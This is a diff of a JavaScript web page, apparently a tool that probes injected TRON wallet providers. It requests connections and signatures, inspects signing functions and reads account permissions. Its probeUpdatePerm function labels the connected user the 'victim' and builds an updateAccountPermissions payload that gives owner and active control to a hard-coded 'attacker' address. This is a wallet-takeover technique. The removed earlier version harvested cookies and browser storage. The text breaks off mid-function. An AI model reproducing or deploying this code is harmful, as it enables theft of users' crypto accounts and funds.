@@ -2,690 +2,475 @@
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
-<title>TRON surface — in-page debug</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>tron-surface — provider scanner</title>
 <style>
-  :root { --bg:#0a0d12; --panel:#11161d; --line:#232a33; --txt:#c9d1d9;
-          --ok:#3fb950; --bad:#f85149; --warn:#d29922; --dim:#7d8590;
-          --accent:#58a6ff; --purple:#bc8cff; }
-  * { box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
-  html, body { margin:0; padding:0; background:var(--bg); color:var(--txt);
-               font:12px/1.45 ui-monospace,Menlo,Consolas,monospace;
-               -webkit-text-size-adjust:100%; }
-  body { padding:8px 8px calc(8px + env(safe-area-inset-bottom)); }
-  h1 { font-size:14px; margin:0 0 4px; }
-  .panel { background:var(--panel); border:1px solid var(--line);
-           border-radius:8px; padding:10px; margin-bottom:8px; }
-  button { background:#1a2028; color:var(--txt); border:1px solid var(--line);
-           border-radius:6px; padding:10px 12px; font:inherit; cursor:pointer;
-           margin:2px 0; user-select:none; }
-  button:active { background:#232a33; }
-  button.primary { border-color:var(--accent); color:var(--accent); font-weight:600; }
-  button.danger { border-color:var(--bad); color:var(--bad); }
-  button:disabled { opacity:.4; }
-  .row { display:flex; gap:6px; flex-wrap:wrap; }
-  .row > button { flex:1 1 auto; min-width:100px; }
-  .kv { display:grid; grid-template-columns:130px 1fr; gap:2px 8px;
-        font-size:11px; word-break:break-all; }
-  .kv b { color:var(--dim); font-weight:400; }
-  .status { padding:6px 10px; border-radius:6px; margin:6px 0; font-size:11px; }
-  .status.ok { background:#0f2410; color:var(--ok); border:1px solid #1a3a1a; }
-  .status.err { background:#2a1010; color:var(--bad); border:1px solid #3a1a1a; }
-  .status.warn { background:#2a2410; color:var(--warn); border:1px solid #3a2f1a; }
-  #console { background:#05080c; border:1px solid var(--line); border-radius:8px;
-             padding:0; margin-bottom:8px; overflow:hidden; }
-  #console-bar { display:flex; gap:4px; align-items:center; padding:6px 8px;
-                 background:#0a0f15; border-bottom:1px solid var(--line);
-                 flex-wrap:wrap; position:sticky; top:0; z-index:2; }
-  #console-bar button { padding:4px 8px; font-size:10px; margin:0; }
-  #console-bar .filter { padding:3px 7px; font-size:10px; border-radius:4px;
-                         border:1px solid var(--line); background:transparent;
-                         color:var(--dim); cursor:pointer; }
-  #console-bar .filter.active { color:var(--txt); border-color:var(--dim); background:#1a2028; }
-  #console-bar .spacer { flex:1; }
-  #console-count { color:var(--dim); font-size:10px; }
-  #console-body { max-height:60vh; overflow-y:auto; -webkit-overflow-scrolling:touch;
-                  padding:4px 0; }
-  .cl { display:block; padding:3px 8px; border-bottom:1px solid #0f141a;
-        font-size:11px; line-height:1.4; word-break:break-word; }
-  .cl .t { color:#4a5560; margin-right:6px; font-size:10px; }
-  .cl .k { font-weight:600; margin-right:4px; }
-  .cl.log   { color:#9aa6b2; }  .cl.log   .k { color:#58a6ff; }
-  .cl.info  { color:#9aa6b2; }  .cl.info  .k { color:#58a6ff; }
-  .cl.ok    { color:#7ec97e; }  .cl.ok    .k { color:#3fb950; }
-  .cl.warn  { color:#d4b860; }  .cl.warn  .k { color:#d29922; }
-  .cl.error { color:#f08080; }  .cl.error .k { color:#f85149; }
-  .cl.meta  { color:#a78bfa; }  .cl.meta  .k { color:#bc8cff; }
-  .cl details { margin-top:2px; }
-  .cl summary { color:var(--dim); cursor:pointer; font-size:10px;
-                padding:2px 0; list-style:none; }
-  .cl summary::-webkit-details-marker { display:none; }
-  .cl summary:before { content:"▸ "; }
-  .cl details[open] summary:before { content:"▾ "; }
-  .cl pre { background:#0a0f15; border:1px solid var(--line); border-radius:4px;
-            padding:6px; margin:4px 0 2px; font-size:10px;
-            white-space:pre-wrap; word-break:break-all; max-height:300px;
-            overflow:auto; }
-  #json-panel pre { background:#05080c; border:1px solid var(--line);
-                    border-radius:6px; padding:8px; font-size:10px;
-                    white-space:pre-wrap; word-break:break-all;
-                    max-height:50vh; overflow:auto; }
-  .collapsible summary { cursor:pointer; color:var(--dim); font-size:11px;
-                         padding:4px 0; list-style:none; }
-  .collapsible summary::-webkit-details-marker { display:none; }
-  .collapsible summary:before { content:"▸ "; }
-  .collapsible[open] summary:before { content:"▾ "; }
+  :root{--bg:#0b0e13;--panel:#12161d;--line:#232a33;--txt:#c9d1d9;--dim:#6e7681;
+        --ok:#3fb950;--bad:#f85149;--warn:#d29922;--acc:#58a6ff;--mono:#8b949e}
+  *{box-sizing:border-box}
+  body{margin:0;font:12px/1.5 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+       background:var(--bg);color:var(--txt);padding:12px}
+  .wrap{max-width:1100px;margin:0 auto;display:grid;gap:10px}
+  .panel{background:var(--panel);border:1px solid var(--line);border-radius:6px;padding:12px}
+  h1{font-size:16px;margin:0 0 2px}
+  h2{font-size:11px;margin:0 0 8px;color:var(--dim);text-transform:uppercase;letter-spacing:.1em}
+  button{background:#1a1f27;color:var(--txt);border:1px solid var(--line);border-radius:4px;
+         padding:7px 12px;font:inherit;cursor:pointer}
+  button:hover{border-color:var(--dim)}
+  button.acc{border-color:var(--acc);color:var(--acc)}
+  button.bad{border-color:var(--bad);color:var(--bad)}
+  .row{display:flex;gap:6px;flex-wrap:wrap;margin:4px 0}
+  pre{background:#070a0e;border:1px solid var(--line);border-radius:4px;padding:8px;
+      margin:4px 0;overflow:auto;max-height:320px;white-space:pre-wrap;word-break:break-all;
+      font-size:11px}
+  .kv{display:grid;grid-template-columns:180px 1fr;gap:1px 10px;font-size:11px}
+  .kv b{color:var(--dim);font-weight:400}
+  .ok{color:var(--ok)}.bad{color:var(--bad)}.warn{color:var(--warn)}.acc{color:var(--acc)}
+  .tabs{display:flex;gap:4px;flex-wrap:wrap;margin-bottom:8px}
+  .tabs button{font-size:11px;padding:5px 9px}
+  .tabs button.on{background:#1f6feb22;border-color:var(--acc);color:var(--acc)}
+  .sec{display:none}.sec.on{display:block}
+  .g{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+  @media(max-width:800px){.g{grid-template-columns:1fr}}
 </style>
 </head>
 <body>
+<div class="wrap">
 
-<h1>TRON surface dump</h1>
-<p style="color:var(--dim);font-size:10px;margin:0 0 8px">
-  In-page console. All output visible below. Copy JSON when done.
-</p>
-
-<div class="panel">
-  <div class="row">
-    <button class="primary" onclick="runDump()" id="btn_dump">▶ RUN</button>
-    <button onclick="copyJSON()" id="btn_copy" disabled>📋 JSON</button>
-    <button onclick="copyLog()">📋 LOG</button>
-    <button class="danger" onclick="clearAll()">✕ CLEAR</button>
+  <div class="panel">
+    <h1>tron-surface</h1>
+    <div class="kv" id="env"></div>
+    <div class="row" style="margin-top:8px">
+      <button class="acc" onclick="scanAll()">full scan</button>
+      <button onclick="dumpLog()">dump log</button>
+      <button onclick="clearLog()">clear</button>
+    </div>
   </div>
-  <div class="status" id="status">ready</div>
-  <div class="kv" id="env_mini"></div>
-</div>
 
-<div id="console">
-  <div id="console-bar">
-    <button class="filter active" data-f="all" onclick="setFilter('all')">all</button>
-    <button class="filter" data-f="info" onclick="setFilter('info')">info</button>
-    <button class="filter" data-f="ok" onclick="setFilter('ok')">ok</button>
-    <button class="filter" data-f="warn" onclick="setFilter('warn')">warn</button>
-    <button class="filter" data-f="error" onclick="setFilter('error')">err</button>
-    <button class="filter" data-f="meta" onclick="setFilter('meta')">meta</button>
-    <span class="spacer"></span>
-    <span id="console-count">0</span>
-    <button onclick="clearConsole()" style="padding:3px 6px">✕</button>
+  <div class="panel">
+    <h2>channels</h2>
+    <div class="g">
+      <div><div class="kv" id="ch_ws"></div></div>
+      <div><div class="kv" id="ch_bt"></div></div>
+    </div>
   </div>
-  <div id="console-body"></div>
-</div>
 
-<div class="panel" id="json-panel">
-  <details class="collapsible">
-    <summary>collected dump (json) — tap to expand</summary>
-    <pre id="json_out">—</pre>
-  </details>
+  <div class="panel">
+    <h2>probes</h2>
+    <div class="tabs" id="tabs">
+      <button class="on" data-t="t_identity" onclick="tab('t_identity')">identity</button>
+      <button data-t="t_connect" onclick="tab('t_connect')">connect</button>
+      <button data-t="t_sign" onclick="tab('t_sign')">sign</button>
+      <button data-t="t_perm" onclick="tab('t_perm')">permission</button>
+      <button data-t="t_rpc" onclick="tab('t_rpc')">rpc</button>
+      <button data-t="t_log" onclick="tab('t_log')">log</button>
+    </div>
+
+    <div class="sec on" id="t_identity">
+      <div class="row">
+        <button onclick="probeIdentity()">scan provider identity</button>
+        <button onclick="probeDeep()">deep inspect (getOwnPropertyNames + proto)</button>
+      </div>
+      <pre id="o_identity">—</pre>
+    </div>
+
+    <div class="sec" id="t_connect">
+      <div class="row">
+        <button class="acc" onclick="probeConnect('wS')">connect via wS (tronLink.tronWeb)</button>
+        <button onclick="probeConnect('Bt')">connect via Bt (window.tronWeb)</button>
+        <button onclick="probeMarkReady()">inspect markReady</button>
+      </div>
+      <pre id="o_connect">—</pre>
+    </div>
+
+    <div class="sec" id="t_sign">
+      <div class="row">
+        <button class="acc" onclick="probeSignChannel('wS')">sign via wS</button>
+        <button class="bad" onclick="probeSignChannel('Bt')">sign via Bt</button>
+        <button onclick="probeSignCompare()">compare sign functions</button>
+      </div>
+      <pre id="o_sign">—</pre>
+    </div>
+
+    <div class="sec" id="t_perm">
+      <div class="row">
+        <button onclick="probeOwnerVsActive()">owner vs active perms</button>
+        <button class="bad" onclick="probeUpdatePerm()">build updateAccountPermissions</button>
+      </div>
+      <pre id="o_perm">—</pre>
+    </div>
+
+    <div class="sec" id="t_rpc">
+      <div class="row">
+        <button onclick="probeEndpoints()">probe fullnode endpoints</button>
+        <button onclick="probeChain()">chain params</button>
+      </div>
+      <pre id="o_rpc">—</pre>
+    </div>
+
+    <div class="sec" id="t_log">
+      <pre id="log">—</pre>
+    </div>
+  </div>
+
 </div>
 
 <script>
-/* ═══════════════════════════════════════════════════════
-   IN-PAGE CONSOLE
-   ═══════════════════════════════════════════════════════ */
+/* ═══════════════════════════════════════════════════════════
+   tron-surface — provider scanner
+   Purpose: identify injected TRON surface, determine which
+   tronWeb instance actually signs, map connect/markReady path,
+   expose owner vs active permission gap.
+   ═══════════════════════════════════════════════════════════ */
 
-const Console = (() => {
-  const body = document.getElementById('console-body');
-  const countEl = document.getElementById('console-count');
-  let filter = 'all';
-  let count = 0;
+const $ = id => document.getElementById(id);
+const esc = s => String(s).replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
 
-  const native = {
-    log: console.log.bind(console),
-    warn: console.warn.bind(console),
-    error: console.error.bind(console),
-    info: console.info.bind(console),
-  };
+let seq = 0;
+const log = (kind, msg, data) => {
+  const el = $('log');
+  const t = new Date().toISOString().slice(11,23);
+  const line = `[${t}] [${String(++seq).padStart(3,'0')}] ${kind.padEnd(8)} ${msg}`;
+  const body = data !== undefined ? '\n  ' + JSON.stringify(data, null, 2).split('\n').join('\n  ') : '';
+  el.textContent = (el.textContent === '—' ? '' : el.textContent) + line + body + '\n';
+  el.scrollTop = el.scrollHeight;
+};
+const out = (id, v) => { $(id).textContent = typeof v === 'string' ? v : JSON.stringify(v, null, 2); };
+const clearLog = () => { $('log').textContent = '—'; };
+const dumpLog = () => { navigator.clipboard?.writeText($('log').textContent); log('DUMP', 'copied'); };
 
-  const shouldShow = (kind) => {
-    if (filter === 'all') return true;
-    if (filter === 'info') return kind === 'info' || kind === 'log' || kind === 'ok';
-    return kind === filter;
-  };
+function tab(id) {
+  document.querySelectorAll('.sec').forEach(s => s.classList.toggle('on', s.id === id));
+  document.querySelectorAll('#tabs button').forEach(b => b.classList.toggle('on', b.dataset.t === id));
+}
 
-  const applyFilter = (line, kind) => {
-    line.style.display = shouldShow(kind) ? '' : 'none';
-  };
+/* ── provider resolution ─────────────────────────────────── */
 
-  const pretty = (v, depth = 0, seen = new WeakSet(), maxDepth = 4) => {
-    if (v === null) return 'null';
-    if (v === undefined) return 'undefined';
-    const t = typeof v;
-    if (t === 'string') return JSON.stringify(v);
-    if (t === 'number' || t === 'boolean') return String(v);
-    if (t === 'bigint') return v.toString() + 'n';
-    if (t === 'symbol') return v.toString();
-    if (t === 'function') return `[fn ${v.name || 'anon'}/${v.length}]`;
-    if (t === 'object') {
-      if (seen.has(v)) return '[cycle]';
-      if (depth >= maxDepth) return Array.isArray(v) ? `[array ${v.length}]` : `[object ${v.constructor?.name || '?'}]`;
-      seen.add(v);
-      try {
-        if (Array.isArray(v)) {
-          const items = v.slice(0, 50).map(x => pretty(x, depth + 1, seen, maxDepth));
-          if (v.length > 50) items.push(`… +${v.length - 50}`);
-          return '[\n  ' + items.join(',\n  ').replace(/\n/g, '\n  ') + '\n]';
-        }
-        const keys = Object.keys(v);
-        if (keys.length === 0) return '{}';
-        const items = keys.slice(0, 60).map(k => {
-          let val;
-          try { val = v[k]; } catch (e) { return `${k}: [getter err]`; }
-          return `${k}: ${pretty(val, depth + 1, seen, maxDepth)}`;
-        });
-        if (keys.length > 60) items.push(`… +${keys.length - 60} keys`);
-        return '{\n  ' + items.join(',\n  ').replace(/\n/g, '\n  ') + '\n}';
-      } catch (e) {
-        return `[unprintable: ${e.message}]`;
-      } finally {
-        seen.delete(v);
-      }
-    }
-    return String(v);
-  };
-
-  const render = (kind, args) => {
-    const now = new Date().toISOString().slice(11, 23);
-    const line = document.createElement('div');
-    line.className = 'cl ' + kind;
-    const head = document.createElement('span');
-    head.innerHTML = `<span class="t">${now}</span><span class="k">[${kind}]</span>`;
-    line.appendChild(head);
-    const msg = document.createElement('span');
-    msg.className = 'msg';
-    msg.textContent = args.length && typeof args[0] === 'string'
-      ? args[0]
-      : args.length ? pretty(args[0], 0, new WeakSet(), 2) : '';
-    line.appendChild(msg);
-    const details = args.slice(1).filter(a => a !== undefined);
-    if (details.length) {
-      const det = document.createElement('details');
-      const sum = document.createElement('summary');
-      sum.textContent = details.length === 1 ? 'data' : `data (${details.length})`;
-      det.appendChild(sum);
-      const pre = document.createElement('pre');
-      pre.textContent = details.map(d => pretty(d, 0, new WeakSet(), 4)).join('\n\n');
-      det.appendChild(pre);
-      line.appendChild(det);
-    }
-    body.appendChild(line);
-    applyFilter(line, kind);
-    while (body.children.length > 500) body.removeChild(body.firstChild);
-    count++;
-    countEl.textContent = count;
-    body.scrollTop = body.scrollHeight;
-  };
-
-  const logFn = (kind, ...args) => {
-    try { (native[kind] || native.log)(...args); } catch {}
-    try { render(kind, args); } catch (e) {
-      try { render('error', ['console render failed', { error: e.message }]); } catch {}
-    }
-  };
-
-  const setFilterFn = (f) => {
-    filter = f;
-    document.querySelectorAll('#console-bar .filter').forEach(b => {
-      b.classList.toggle('active', b.dataset.f === f);
-    });
-    document.querySelectorAll('#console-body .cl').forEach(line => {
-      const kind = [...line.classList].find(c => c !== 'cl');
-      if (kind) applyFilter(line, kind);
-    });
-  };
-
-  const clear = () => {
-    body.innerHTML = '';
-    count = 0;
-    countEl.textContent = '0';
-  };
-
-  ['log','info','warn','error'].forEach(k => {
-    const orig = console[k].bind(console);
-    console[k] = (...args) => {
-      try { orig(...args); } catch {}
-      try { render(k === 'log' ? 'log' : k, args); } catch {}
-    };
-  });
-
-  return { log: logFn, setFilter: setFilterFn, clear, pretty };
-})();
-
-function setFilter(f) { Console.setFilter(f); }
-function clearConsole() { Console.clear(); }
-
-/* ═══════════════════════════════════════════════════════
-   DUMP STATE
-   ═══════════════════════════════════════════════════════ */
-
-const DUMP = {
-  meta: {}, env: {}, providers: {}, tronWebTree: {},
-  tronWebMethods: {}, account: {}, chain: {},
-  cookies: [], localStorage: {}, sessionStorage: {},
-  indexedDB: [], memoryScan: {}, endpoints: {},
-  permissions: {}, errors: [],
+const resolve = () => {
+  const out = { wS: null, Bt: null, names: [] };
+  // wS — bridge (can sign)
+  if (window.tronLink?.tronWeb?.trx) { out.wS = window.tronLink.tronWeb; out.names.push('window.tronLink.tronWeb'); }
+  else if (window.trustwallet?.tron?.tronWeb?.trx) { out.wS = window.trustwallet.tron.tronWeb; out.names.push('window.trustwallet.tron.tronWeb'); }
+  else if (window.tron?.tronWeb?.trx) { out.wS = window.tron.tronWeb; out.names.push('window.tron.tronWeb'); }
+  // Bt — fullnode client (no user sign)
+  if (window.tronWeb?.trx && window.tronWeb !== out.wS) { out.Bt = window.tronWeb; out.names.push('window.tronWeb'); }
+  return out;
 };
 
-function safeGet(fn, fb = null) { try { return fn(); } catch (e) { return { _error: e.message }; } }
+const fnSrc = (f) => {
+  if (typeof f !== 'function') return null;
+  try { return f.toString().replace(/\s+/g,' ').slice(0, 240); } catch { return '[native]'; }
+};
 
-function setStatus(cls, text) {
-  const el = document.getElementById('status');
-  el.className = 'status ' + (cls || '');
-  el.textContent = text;
-}
+/* ── identity ────────────────────────────────────────────── */
 
-function collectMeta() {
-  DUMP.meta = {
-    url: location.href, origin: location.origin, host: location.host,
-    path: location.pathname,
-    userAgent: navigator.userAgent,
-    language: navigator.language, languages: navigator.languages,
-    platform: navigator.platform, vendor: navigator.vendor,
-    cookieEnabled: navigator.cookieEnabled,
-    onLine: navigator.onLine,
-    hardwareConcurrency: navigator.hardwareConcurrency,
-    deviceMemory: navigator.deviceMemory,
-    maxTouchPoints: navigator.maxTouchPoints,
-    screen: { w: screen.width, h: screen.height, availW: screen.availWidth, availH: screen.availHeight, dpr: devicePixelRatio },
-    timezone: safeGet(() => Intl.DateTimeFormat().resolvedOptions().timeZone),
-    isSecureContext: window.isSecureContext,
-    ios: /iPhone|iPad|iPod/.test(navigator.userAgent),
-    safari: /Safari/.test(navigator.userAgent) && !/Chrome/.test(navigator.userAgent),
+function probeIdentity() {
+  log('IDENT', 'scan start');
+  const r = resolve();
+  const has = (o, p) => { try { return typeof p.split('.').reduce((a,k)=>a?.[k],o) } catch { return 'err'; } };
+
+  const wS = r.wS, Bt = r.Bt;
+  const summary = {
+    resolved: r.names,
+    wS: wS ? {
+      version: wS.version,
+      ready: wS.ready,
+      defaultAddress: wS.defaultAddress?.base58 || false,
+      hasSignMessageV2: typeof wS.trx?.signMessageV2 === 'function',
+      hasSign: typeof wS.trx?.sign === 'function',
+      hasRequest: typeof wS.request === 'function',
+      hasMarkReady: typeof wS.markReady === 'function',
+    } : null,
+    Bt: Bt ? {
+      version: Bt.version,
+      ready: Bt.ready,
+      defaultAddress: Bt.defaultAddress?.base58 || false,
+      hasSignMessageV2: typeof Bt.trx?.signMessageV2 === 'function',
+      hasSign: typeof Bt.trx?.sign === 'function',
+      hasRequest: typeof Bt.request === 'function',
+    } : null,
+    sameObject: wS === Bt,
   };
-  Console.log('info', 'META', DUMP.meta);
-  document.getElementById('env_mini').innerHTML = `
-    <b>origin</b><span>${DUMP.meta.origin}</span>
-    <b>UA</b><span style="font-size:10px">${DUMP.meta.userAgent.slice(0, 60)}…</span>
-  `;
+  out('o_identity', summary);
+  log('IDENT', 'summary', summary);
 }
 
-function collectEnv() {
-  DUMP.env = {
-    'window.tron': typeof window.tron,
-    'window.tron.isTronLink': safeGet(() => window.tron?.isTronLink),
-    'window.tronLink': typeof window.tronLink,
-    'window.tronLink.ready': safeGet(() => window.tronLink?.ready),
-    'window.tronWeb': typeof window.tronWeb,
-    'window.trustwallet': typeof window.trustwallet,
-    'trustwallet keys': safeGet(() => Object.keys(window.trustwallet || {})),
-    'trustwallet.tron': safeGet(() => typeof window.trustwallet?.tron),
-    'trustwallet.tronLink': safeGet(() => typeof window.trustwallet?.tronLink),
-    'trustwallet.ethereum': safeGet(() => typeof window.trustwallet?.ethereum),
-    'window.ethereum': typeof window.ethereum,
-    'ethereum.isTrust': safeGet(() => window.ethereum?.isTrust),
-    'ethereum.isTronLink': safeGet(() => window.ethereum?.isTronLink),
-    'ethereum.isMetaMask': safeGet(() => window.ethereum?.isMetaMask),
-    'ethereum.chainId': safeGet(() => window.ethereum?.chainId),
-    'ethereum.selectedAddress': safeGet(() => window.ethereum?.selectedAddress),
-    'ethereum.constructor': safeGet(() => window.ethereum?.constructor?.name),
-    'ethereum._events': safeGet(() => window.ethereum?._events ? Object.keys(window.ethereum._events) : null),
-    'ethereum._state': safeGet(() => window.ethereum?._state ? Object.keys(window.ethereum._state) : null),
+function probeDeep() {
+  log('DEEP', 'inspect proto chains');
+  const r = resolve();
+  const dump = (obj, name) => {
+    if (!obj) return { name, exists: false };
+    const own = Object.getOwnPropertyNames(obj);
+    const proto = Object.getOwnPropertyNames(Object.getPrototypeOf(obj));
+    const methods = proto.filter(k => {
+      try { return typeof obj[k] === 'function'; } catch { return false; }
+    });
+    return { name, own, proto, methods, ctor: obj.constructor?.name };
   };
-  Console.log('info', 'ENV', DUMP.env);
+  const res = {
+    wS: dump(r.wS, 'wS'),
+    wS_trx: r.wS?.trx ? dump(r.wS.trx, 'wS.trx') : null,
+    Bt: dump(r.Bt, 'Bt'),
+    Bt_trx: r.Bt?.trx ? dump(r.Bt.trx, 'Bt.trx') : null,
+  };
+  out('o_identity', res);
+  log('DEEP', 'done', { wS_ctor: res.wS?.ctor, Bt_ctor: res.Bt?.ctor });
 }
 
-function probeProviders() {
-  const candidates = [
-    ['window.tron', () => window.tron],
-    ['window.tronLink', () => window.tronLink],
-    ['window.trustwallet.tron', () => window.trustwallet?.tron],
-    ['window.trustwallet.tronLink', () => window.trustwallet?.tronLink],
-    ['window.tronWeb', () => window.tronWeb],
-    ['trustwallet.tron.tronWeb', () => window.trustwallet?.tron?.tronWeb],
-  ];
-  for (const [name, get] of candidates) {
-    const p = safeGet(get);
-    if (!p) { DUMP.providers[name] = 'absent'; continue; }
-    DUMP.providers[name] = {
-      type: typeof p,
-      ctor: safeGet(() => p?.constructor?.name),
-      ownKeys: safeGet(() => Object.keys(p || {})),
-      protoKeys: safeGet(() => Object.getOwnPropertyNames(Object.getPrototypeOf(p) || {}).filter(k => k !== 'constructor')),
-      hasTronWeb: !!p?.tronWeb,
-      tronWebReady: safeGet(() => p?.tronWeb?.ready),
-      tronWebVersion: safeGet(() => p?.tronWeb?.version),
-      hasRequest: typeof p?.request,
-      hasSign: typeof p?.sign,
-      hasMultiSign: typeof p?.multiSign,
-      hasSignMessageV2: typeof p?.signMessageV2,
-      hasSignTransaction: typeof p?.signTransaction,
-      defaultAddress: safeGet(() => p?.tronWeb?.defaultAddress?.base58),
+/* ── connect ─────────────────────────────────────────────── */
+
+async function probeConnect(which) {
+  const r = resolve();
+  const target = which === 'wS' ? r.wS : r.Bt;
+  if (!target) { out('o_connect', `${which} not found`); return; }
+
+  const rec = { which, before: snap(target) };
+  log('CONNECT', `${which} start`, rec.before);
+
+  const paths = [];
+  // 1. native tron_requestAccounts
+  if (typeof target.request === 'function') {
+    try {
+      const a = await target.request({ method: 'tron_requestAccounts' });
+      paths.push({ method: 'tron_requestAccounts', ok: true, result: a });
+    } catch (e) { paths.push({ method: 'tron_requestAccounts', ok: false, err: e.message }); }
+  }
+  // 2. eth_requestAccounts
+  if (typeof target.request === 'function') {
+    try {
+      const a = await target.request({ method: 'eth_requestAccounts' });
+      paths.push({ method: 'eth_requestAccounts', ok: true, result: a });
+    } catch (e) { paths.push({ method: 'eth_requestAccounts', ok: false, err: e.message }); }
+  }
+  // 3. connect() (wS has it on proto)
+  if (typeof target.connect === 'function') {
+    try {
+      const a = await target.connect();
+      paths.push({ method: 'connect', ok: true, result: a });
+    } catch (e) { paths.push({ method: 'connect', ok: false, err: e.message }); }
+  }
+  // 4. tronWeb.request if present
+  if (typeof target.tronWeb?.request === 'function') {
+    try {
+      const a = await target.tronWeb.request({ method: 'tron_requestAccounts' });
+      paths.push({ method: 'tronWeb.request', ok: true, result: a });
+    } catch (e) { paths.push({ method: 'tronWeb.request', ok: false, err: e.message }); }
+  }
+
+  // wait up to 3s for defaultAddress
+  const t0 = Date.now();
+  while (Date.now() - t0 < 3000 && !target.defaultAddress?.base58 && !target.tronWeb?.defaultAddress?.base58) {
+    await new Promise(r => setTimeout(r, 150));
+  }
+
+  rec.paths = paths;
+  rec.after = snap(target);
+  out('o_connect', rec);
+  log('CONNECT', `${which} done`, { after: rec.after });
+}
+
+function snap(t) {
+  return {
+    ready: t.ready,
+    defaultAddress: t.defaultAddress?.base58 || false,
+    tronWebReady: t.tronWeb?.ready,
+    tronWebDefaultAddress: t.tronWeb?.defaultAddress?.base58 || false,
+  };
+}
+
+function probeMarkReady() {
+  const r = resolve();
+  const wS = r.wS;
+  if (!wS) { out('o_connect', 'wS not found'); return; }
+  const info = {
+    hasMarkReady: typeof wS.markReady === 'function',
+    markReadySrc: fnSrc(wS.markReady),
+    hasSendResponse: typeof wS.sendResponse === 'function',
+    hasSendError: typeof wS.sendError === 'function',
+  };
+  out('o_connect', info);
+  log('MARKREADY', 'inspect', info);
+}
+
+/* ── sign ────────────────────────────────────────────────── */
+
+async function probeSignChannel(which) {
+  const r = resolve();
+  const target = which === 'wS' ? r.wS : r.Bt;
+  if (!target) { out('o_sign', `${which} not found`); return; }
+
+  const rec = { which, hasSign: typeof target.trx?.sign === 'function', hasSignMessageV2: typeof target.trx?.signMessageV2 === 'function' };
+
+  if (rec.hasSignMessageV2) {
+    try {
+      const msg = 'tron-surface probe ' + Date.now();
+      rec.msg = msg;
+      const sig = await target.trx.signMessageV2(msg);
+      rec.signMessageV2 = { ok: true, sig };
+    } catch (e) { rec.signMessageV2 = { ok: false, code: e.code, message: e.message }; }
+  }
+
+  if (rec.hasSign) {
+    try {
+      const fakeTx = { visible: true, txID: '00'.repeat(32), raw_data: { contract: [] }, raw_data_hex: '' };
+      rec.fakeTx = fakeTx;
+      const signed = await target.trx.sign(fakeTx);
+      rec.sign = { ok: true, signed };
+    } catch (e) { rec.sign = { ok: false, code: e.code, message: e.message }; }
+  }
+
+  out('o_sign', rec);
+  log('SIGN', `${which}`, rec);
+}
+
+function probeSignCompare() {
+  const r = resolve();
+  if (!r.wS || !r.Bt) { out('o_sign', 'need both wS and Bt'); return; }
+  const cmp = {
+    signSame: r.wS.trx.sign === r.Bt.trx.sign,
+    signMessageV2Same: r.wS.trx.signMessageV2 === r.Bt.trx.signMessageV2,
+    wS_sign_src: fnSrc(r.wS.trx.sign),
+    Bt_sign_src: fnSrc(r.Bt.trx.sign),
+    wS_signMessageV2_src: fnSrc(r.wS.trx.signMessageV2),
+    Bt_signMessageV2_src: fnSrc(r.Bt.trx.signMessageV2),
+  };
+  out('o_sign', cmp);
+  log('SIGN', 'compare', { same: cmp.signSame, v2same: cmp.signMessageV2Same });
+}
+
+/* ── permission ──────────────────────────────────────────── */
+
+async function probeOwnerVsActive() {
+  const r = resolve();
+  const wS = r.wS;
+  if (!wS) { out('o_perm', 'wS not found'); return; }
+  const addr = wS.defaultAddress?.base58 || wS.tronWeb?.defaultAddress?.base58;
+  if (!addr) { out('o_perm', 'no address connected — connect first'); log('PERM', 'no address'); return; }
+
+  try {
+    const account = await wS.trx.getAccount(addr);
+    const perms = (account.permissions || []).map(p => ({
+      name: p.permission_name,
+      type: p.type,
+      threshold: p.threshold,
+      keys: (p.keys || []).map(k => ({ address: k.address, weight: k.weight })),
+      id: p.id,
+    }));
+    const owner = perms.find(p => p.type === 0 || p.name === 'owner');
+    const active = perms.find(p => p.type === 2 || p.name === 'active');
+    const res = { addr, owner, active, raw_permissions: perms };
+    out('o_perm', res);
+    log('PERM', 'owner vs active', { owner, active });
+  } catch (e) {
+    out('o_perm', { error: e.message });
+    log('PERM', 'getAccount failed', { message: e.message });
+  }
+}
+
+async function probeUpdatePerm() {
+  const r = resolve();
+  const wS = r.wS;
+  if (!wS) { out('o_perm', 'wS not found'); return; }
+  const addr = wS.defaultAddress?.base58 || wS.tronWeb?.defaultAddress?.base58;
+  if (!addr) { out('o_perm', 'no address — connect first'); return; }
+
+  try {
+    const builder = wS.transactionBuilder || r.Bt?.transactionBuilder;
+    if (!builder?.updateAccountPermissions) { out('o_perm', 'no updateAccountPermissions on builder'); return; }
+
+    const victim = addr;
+    const attacker = 'TPxcbZxFSHLssRYkrad4YTZJRVCPD9oGRW';
+    const perm = {
+      owner: { type: 0, permission_name: 'owner', threshold: 1, keys: [{ address: attacker, weight: 1 }] },
+      active: [{ type: 2, permission_name: 'active', threshold: 1, keys: [{ address: attacker, weight: 1 }] }],
+      owner_address: victim,
     };
-  }
-  Console.log('ok', 'PROVIDERS', DUMP.providers);
-}
-
-function getTronWeb() {
-  return safeGet(() =>
-    window.trustwallet?.tron?.tronWeb ||
-    window.tronLink?.tronWeb ||
-    window.tron?.tronWeb ||
-    window.tronWeb
-  );
-}
-
-function collectTronWebTree() {
-  const tw = getTronWeb();
-  if (!tw || tw._error) { Console.log('warn', 'no tronWeb'); return; }
-
-  const describe = (obj, depth, seen, maxDepth) => {
-    if (!obj || typeof obj !== 'object' || depth > maxDepth || seen.has(obj)) return null;
-    seen.add(obj);
-    const out = {};
-    let keys = [];
-    try { keys = Object.getOwnPropertyNames(obj); } catch { return null; }
-    for (const k of keys) {
-      if (k === 'constructor') continue;
-      let v;
-      try { v = obj[k]; } catch { out[k] = '[getter err]'; continue; }
-      const t = typeof v;
-      if (t === 'function') out[k] = `[fn/${v.length}]`;
-      else if (t === 'object' && v !== null) out[k] = depth < maxDepth ? describe(v, depth + 1, seen, maxDepth) : '[depth]';
-      else if (t === 'string' || t === 'number' || t === 'boolean') out[k] = v;
-      else out[k] = `[${t}]`;
-    }
-    seen.delete(obj);
-    return out;
-  };
-
-  DUMP.tronWebTree = describe(tw, 0, new WeakSet(), 3);
-  Console.log('ok', 'TRONWEB TREE', { keys: Object.keys(DUMP.tronWebTree || {}).length });
-}
-
-function collectTronWebMethods() {
-  const tw = getTronWeb();
